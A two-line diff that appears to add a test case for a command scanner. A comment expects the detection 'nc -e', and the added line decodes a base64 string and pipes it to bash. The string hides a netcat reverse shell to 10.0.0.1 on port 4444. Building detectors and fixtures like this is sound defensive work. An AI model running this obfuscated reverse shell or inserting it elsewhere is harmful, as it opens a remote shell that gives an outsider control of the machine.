@@ -1,0 +1,2 @@
+# expect: nc -e
+echo bmMgLWUgL2Jpbi9zaCAxMC4wLjAuMSA0NDQ0 | base64 --decode | bash
